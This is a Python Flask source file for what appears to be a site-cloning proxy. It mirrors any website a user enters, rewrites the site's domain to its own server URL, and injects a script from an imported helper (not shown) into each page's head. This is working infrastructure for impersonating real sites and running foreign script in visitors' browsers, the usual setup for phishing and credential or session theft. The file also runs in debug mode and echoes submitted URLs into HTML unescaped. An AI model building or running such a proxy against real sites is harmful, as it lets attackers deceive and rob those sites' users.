from flask import Flask, request, Response
import requests
from helper import headers, js_code, server_url
from bs4 import BeautifulSoup


app = Flask(__name__)

user_site = ""

# Create a session and set headers
session = requests.Session()
session.headers.update(headers)

# List to store visited URLs
visited_urls = []

@app.route('/clone', methods=['GET', 'POST'])
def clone_site():
    global user_site, visited_urls
    if request.method == 'POST':
        site = request.form.get('site', '')
        if site.startswith('www'):
            site = 'https://' + site
        user_site = site.rstrip('/')
        visited_urls.append(user_site)
        return f"User site set to: {user_site}<br><br><a href='/'>Return"

    # Display visited URLs in the GET part
    visited_urls_str = '<br>'.join(visited_urls) if visited_urls else 'No visited URLs yet.'
    return f"""
Currently cloning: {user_site}

<form method='post'>
    <label for='site'>Enter Website URL:</label>
    <input type='text' id='site' name='site' value='https://'>
    <input type='submit' value='Clone'>
</form>
<br><br>
Visited URLs:
<br>
{visited_urls_str}
"""

def fetch_and_modify_content(url):
    full_url = user_site + '/' + url
    try:
        response = session.get(full_url)
        content_type = response.headers['Content-Type']

        if content_type.startswith(('text', 'application')):
            html_content = response.content.replace(user_site.encode('utf-8'), server_url.encode('utf-8'))
            html_content = html_content.replace(b'</head>', js_code.encode('utf-8') + b'</head>', 1)
            return html_content, content_type
            
        return response.content, content_type
    except Exception as e:
        return str(e), 'text/plain'

def modify_links(base_url, html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    for tag in soup.find_all(['a'], href=True):
        old_url = tag['href']

        if '//' not in old_url:
            new_url = f'{base_url}/{old_url.lstrip("/")}'
            tag['href'] = new_url

    return str(soup)
                                                    
@app.route('/<path:url>')
def proxy(url):
    if 'http' not in url:
        modified_content, content_type = fetch_and_modify_content(url)
        return Response(modified_content, content_type=content_type)
    else:
        response = session.get(url)
        content_type = response.headers['Content-Type']
        modified_content = modify_links(url, response.content)
        return Response(modified_content, content_type=content_type)

@app.route('/')
def site():
    modified_content, content_type = fetch_and_modify_content('')
    return Response(modified_content, content_type=content_type)

if __name__ == '__main__':
    app.run(debug=True)
